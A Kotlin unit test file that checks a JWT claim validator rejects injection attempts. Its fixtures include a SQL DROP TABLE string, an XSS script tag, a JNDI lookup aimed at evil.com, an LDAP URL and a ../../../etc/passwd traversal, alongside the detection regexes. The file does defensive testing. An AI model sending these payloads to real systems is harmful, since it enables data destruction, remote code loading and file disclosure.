package com.axians.eaf.framework.security.validation

import com.axians.eaf.framework.security.InjectionDetector
import io.micrometer.core.instrument.simple.SimpleMeterRegistry
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import org.springframework.security.oauth2.jwt.Jwt
import java.time.Instant

/**
 * Unit tests for JwtInjectionValidator (Layer 10: Injection Detection).
 *
 * Tests validate that JWT claims are scanned for malicious injection patterns
 * including SQL injection, XSS, JNDI injection, Expression Injection, and
 * Path Traversal attacks. Uses InjectionDetector for comprehensive pattern matching.
 *
 * Migrated from Kotest to JUnit 6 on 2025-11-20
 *
 * Story 3.8: User Validation and Injection Detection (Layers 9-10)
 */
class JwtInjectionValidatorTest {

    private val injectionDetector = InjectionDetector()
    private val validator = JwtInjectionValidator(injectionDetector, SimpleMeterRegistry())

    @Test
    fun `valid JWT with safe claims should pass validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "name" to "John Doe",
                "email" to "john.doe@example.com",
                "tenant_id" to "tenant-a",
                "roles" to listOf("WIDGET_ADMIN"),
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isFalse()
    }

    @Test
    fun `JWT with SQL injection in sub claim should fail validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user'; DROP TABLE users; --",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
        assertThat(result.errors.first().description).isEqualTo(
            "JWT claim contains potential injection pattern: Potential injection detected in claim 'sub': " +
                "pattern=(?i).*(--).*"
        )
    }

    @Test
    fun `JWT with XSS injection in name claim should fail validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "name" to "<script>alert('xss')</script>",
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
        assertThat(result.errors.first().description).contains("JWT claim contains potential injection pattern")
    }

    @Test
    fun `JWT with JNDI injection in email claim should fail validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "email" to "user@ldap://malicious.com",
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
        assertThat(result.errors.first().description).isEqualTo(
            "JWT claim contains potential injection pattern: Potential injection detected in claim 'email': " +
                "pattern=(?i).*(jndi:|ldap:|rmi:).*"
        )
    }

    @Test
    fun `JWT with Expression Injection in custom claim should fail validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "custom_data" to "\${jndi:ldap://evil.com}",
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
        assertThat(result.errors.first().description).contains("JWT claim contains potential injection pattern")
    }

    @Test
    fun `JWT with Path Traversal in file_path claim should fail validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "file_path" to "../../../etc/passwd",
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        assertThat(result.errors.first().errorCode).isEqualTo("invalid_request")
        assertThat(result.errors.first().description).isEqualTo(
            "JWT claim contains potential injection pattern: Potential injection detected in claim 'file_path': " +
                "pattern=.*(\\.\\.[\\\\/]).*"
        )
    }

    @Test
    fun `JWT with multiple injection patterns should fail on first detected pattern`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "name" to "<script>alert('xss')</script>",
                "email" to "user@ldap://malicious.com",
                // This would be second pattern, but should not reach here
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isTrue()
        // Should fail on the first detected pattern (name claim matches XSS pattern due to "<script>")
        assertThat(result.errors.first().description.contains("name")).isTrue()
        assertThat(result.errors.first().description.contains("<script")).isTrue()
    }

    @Test
    fun `JWT with non-string claims should be ignored by injection detection`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "roles" to listOf("ADMIN", "USER"), // List, not String
                "permissions" to mapOf("read" to true, "write" to false), // Map, not String
                "count" to 42, // Number, not String
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isFalse()
    }

    @Test
    fun `JWT with safe special characters should pass validation`() {
        val jwt = createJwt(
            claims = mapOf(
                "sub" to "user-123",
                "iss" to "https://keycloak.example.com/realms/eaf",
                "aud" to "eaf-api",
                "exp" to Instant.now().plusSeconds(3600),
                "iat" to Instant.now(),
                "name" to "O'Connor-Smith", // Safe apostrophe
                "email" to "user+tag@example.com", // Safe plus sign
                "description" to "Item #1: 100% complete", // Safe percent, hash, colon
            ),
        )

        val result = validator.validate(jwt)

        assertThat(result.hasErrors()).isFalse()
    }
}

/**
 * Helper function to create a test JWT with specified claims.
 */
private fun createJwt(claims: Map<String, Any>): Jwt {
    val headers = mapOf("alg" to "RS256", "typ" to "JWT")
    val tokenValue = "mock-token-value"

    return Jwt.withTokenValue(tokenValue)
        .headers { h -> h.putAll(headers) }
        .claims { c -> c.putAll(claims) }
        .build()
}
